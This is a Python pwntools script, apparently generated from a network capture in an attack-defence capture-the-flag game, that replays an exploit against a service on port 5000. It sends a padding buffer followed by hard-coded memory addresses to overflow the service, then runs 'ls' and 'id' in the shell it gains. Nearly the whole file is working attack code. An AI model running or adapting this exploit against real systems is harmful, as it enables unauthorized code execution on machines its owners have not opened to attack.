#!/usr/bin/env python3
# Filename: replay-taller_icc_1-5000-2195090474269470.py
import json
import os
import random

from pwn import *

"""
This file was generated from network capture towards 192.168.159.132 (TCP).
Corresponding flow id: 2195090474269470
Service: taller_icc_1-5000
"""

# Set logging level
context.log_level = "DEBUG"  # or INFO, WARNING, ERROR

# Load arguments
# EXTRA is an array of the flagids for current service and team
if len(sys.argv) < 2:
    print(f'Usage: {sys.argv[0]} <target> [flag_id]')
    sys.exit(1)
HOST = sys.argv[1]
if len(sys.argv) > 2:
    EXTRA = json.loads(bytes.fromhex(sys.argv[2]).decode())
else:
    EXTRA = []

# Connect to remote and run the actual exploit
# Timeout is important to prevent stall
r = remote(HOST, 5000, typ="tcp", timeout=2)

# SNIPPET: Generate uniformly random strings of length `k`
# rand_choice = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
# value = "".join(random.choices(rand_choice, k=16))

# FIXME: You should identify if a flag_id was used in the following
# payload. If it is the case, then you should loop using EXTRA.
# for flag_id in EXTRA:
data = r.recvuntil(b'oose an option: ')
r.sendline(b'1')
r.send(b'AAAAAAAA')
data = r.recvuntil(b'oose an option: ')
r.sendline(b'1')
r.send(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe5\xc7zT>\x7f\x00\x001\xb0\x91T>\x7f\x00\x00\x99\xbezT>\x7f\x00\x00\x90\x14}T>\x7f\x00\x00')
data = r.recvuntil(b'oose an option: ')
r.sendline(b'3')
data = r.recvuntil(b'Exiting...\n')
r.sendline(b'ls')
data = r.recvuntil(b'nuz\nvmlinuz.old\n')
r.sendline(b'id')
data = r.recvuntil(b'=65534(nogroup)\n')
r.sendline(b'ls')
data = r.recvuntil(b'nuz\nvmlinuz.old\n')

# Use the following to capture all remaining bytes:
# data = r.recvall(timeout=5)
# print(data, flush=True)

r.close()